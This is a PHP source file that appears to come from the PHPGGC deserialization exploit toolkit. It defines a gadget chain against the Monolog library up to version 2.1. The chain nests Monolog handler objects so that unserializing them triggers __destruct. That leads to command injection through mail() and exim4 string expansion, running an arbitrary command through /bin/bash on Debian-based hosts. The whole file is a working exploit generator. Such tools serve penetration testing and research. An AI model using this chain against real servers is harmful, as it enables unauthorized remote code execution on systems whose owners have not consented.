<?php

namespace GadgetChain\Monolog;

class CMD1 extends \PHPGGC\GadgetChain\CMDInjection
{
    public static $version = '? <= 2.1';
    public static $vector = '__destruct';
    public static $author = 'whira';
    public static $information = 'This chain will target debian based distribution (exim4 MTA) as it will perform a command injection on mail() and use exim4 extented strings, the payload is `/bin/bash -c "$command"`';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        return new \Monolog\Handler\RollbarHandler(
            new \Monolog\Handler\BufferHandler(
                new \Monolog\Handler\NativeMailerHandler($command)
            )
        );
    }
}
